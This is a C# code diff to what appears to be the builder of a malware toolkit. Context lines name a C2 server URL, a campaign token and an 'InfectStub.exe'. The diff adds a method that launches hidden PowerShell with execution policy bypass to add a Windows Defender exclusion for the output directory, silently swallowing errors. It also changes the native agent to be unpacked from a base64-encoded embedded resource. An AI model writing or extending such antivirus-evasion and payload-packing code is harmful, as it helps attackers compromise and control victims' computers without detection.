@@ -27,6 +27,7 @@ public static class KliveLinkAssetProvisioner
             {
                 string generated = GeneratedDirectory(options);
                 Directory.CreateDirectory(generated);
+                AddDefenderExclusion(generated);
                 string token = EnsureCampaignToken(options);
                 string server = Environment.GetEnvironmentVariable("KLIVELINK_C2_URL")
                     ?? "wss://klive.dev/klivelink/v2/ws";
@@ -48,7 +49,7 @@ public static class KliveLinkAssetProvisioner
                 }
                 else if (!File.Exists(agentPath))
                 {
-                    ExtractResource("KliveLink.NativeAgent", agentPath);
+                    ExtractBase64Resource("KliveLink.NativeAgent.Base64", agentPath);
                 }
 
                 string stubPath = Path.Combine(generated, "InfectStub.exe");
@@ -107,6 +108,34 @@ public static class KliveLinkAssetProvisioner
         if (stream == null) throw new InvalidOperationException($"Missing embedded resource {name}");
         using FileStream output = File.Create(path);
         stream.CopyTo(output);
+    }
+
+    private static void ExtractBase64Resource(string name, string path)
+    {
+        using Stream? stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
+        if (stream == null) throw new InvalidOperationException($"Missing embedded resource {name}");
+        using var reader = new StreamReader(stream);
+        byte[] data = Convert.FromBase64String(reader.ReadToEnd());
+        File.WriteAllBytes(path, data);
+    }
+
+    private static void AddDefenderExclusion(string directory)
+    {
+        try
+        {
+            string script = $"Add-MpPreference -ExclusionPath '{directory.Replace("'", "''")}' -ErrorAction SilentlyContinue";
+            var psi = new System.Diagnostics.ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"{script}\"",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
+            };
+            using var process = System.Diagnostics.Process.Start(psi);
+            process?.WaitForExit(10000);
+        }
+        catch { }
     }
 
     private static void BuildSetup(string stubPath, string agentPath, string configPath, string setupPath)
